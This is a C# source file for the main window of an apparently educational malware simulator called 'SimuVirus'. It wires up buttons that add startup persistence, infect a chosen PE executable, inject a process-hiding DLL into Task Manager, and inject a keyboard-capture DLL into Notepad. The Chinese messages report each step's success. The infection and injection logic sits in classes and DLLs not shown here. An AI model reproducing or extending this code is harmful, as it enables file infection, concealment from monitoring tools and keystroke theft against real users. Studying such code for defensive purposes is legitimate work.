using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using SimuVirus.deploy;
using SimuVirus.tools;
using System.Diagnostics;
using System.Windows.Forms;

namespace SimuVirus
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public List<Task> tasks;
        public MainWindow()
        {
            InitializeComponent();
            tasks = new List<Task>();
            Info info = new Info();
            info.initialize();
        }

        private void Set_Startup(object sender, RoutedEventArgs e)
        {
            tasks.Add(Task.Factory.StartNew(() =>
            {
                Startup startup = new Startup();
                startup.init_startup();
                System.Windows.Forms.MessageBox.Show("设置开机启动成功");
            }));
        }

        private void Infect_PE(object sender, RoutedEventArgs e)
        {
            OpenFileDialog openFileDialog1 = new OpenFileDialog();
            string pePath = null;

            openFileDialog1.InitialDirectory = "c:\\";
            openFileDialog1.Filter = "exe files(*.exe) | *.exe | All files(*.*) | *.*";
            openFileDialog1.FilterIndex = 2;
            openFileDialog1.RestoreDirectory = true;

            if (openFileDialog1.ShowDialog() == System.Windows.Forms.DialogResult.OK)
            {
                pePath = openFileDialog1.FileName;
            }
            tasks.Add(Task.Factory.StartNew(() =>
            {
                Infect infect = new Infect();
                if (pePath != null)
                    infect.infectPe(pePath);    
            }));
        }

        private void Hide_Process(object sender, RoutedEventArgs e)
        {

            tasks.Add(Task.Factory.StartNew(() =>
            {
                byte[] dllPath = Encoding.ASCII.GetBytes(Info.currentDirectory + "\\HideProcess.dll");
                //string exePath = Info.currentDirectory + "\\DllInject.exe";

                Process[] targetProcesses = Process.GetProcessesByName("Taskmgr");
                foreach (Process target in targetProcesses)
                {
                    Inject inject = new Inject();
                    if (inject.injectDll(target.Id, dllPath))
                        System.Windows.Forms.MessageBox.Show("隐藏进程成功");
                    else
                        System.Windows.Forms.MessageBox.Show("隐藏进程失败");
                }
            }));
        }

        private void Get_KeyboardInput(object sender, RoutedEventArgs e)
        {
            tasks.Add(Task.Factory.StartNew(() =>
            {
                byte[] dllPath = Encoding.ASCII.GetBytes(Info.currentDirectory + "\\GetKeyboardInput.dll");

                Process[] targetProcesses = Process.GetProcessesByName("Notepad");
                foreach (Process target in targetProcesses)
                {
                    Inject inject = new Inject();
                    if (inject.injectDll(target.Id, dllPath))
                        System.Windows.Forms.MessageBox.Show("注入成功");
                    else
                        System.Windows.Forms.MessageBox.Show("注入失败");
                }
            }));
        }
    }
}
